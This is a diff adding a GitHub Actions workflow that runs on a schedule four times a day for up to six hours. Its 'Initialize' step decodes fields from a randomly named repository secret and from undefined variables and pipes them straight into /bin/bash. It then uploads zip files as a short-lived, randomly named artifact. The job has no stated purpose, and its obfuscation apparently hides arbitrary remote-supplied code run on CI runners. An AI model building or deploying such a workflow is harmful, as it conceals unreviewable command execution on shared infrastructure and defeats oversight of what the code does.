@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '18 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          wss2459: ${{ secrets.wss2459 }}
+        run: |
+          printf '%s' "$wss2459" | jq -r .rxz916 | /bin/bash
+          printf '%s' "$p7559" | jq -r .y602 | /bin/bash
+          printf '%s' "$fmv37" | jq -r .yj5 | /bin/bash
+          echo $xrm45020 | jq -r .rt315 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: FmEpSHu2
+          path: "*.zip"
+          retention-days: 1
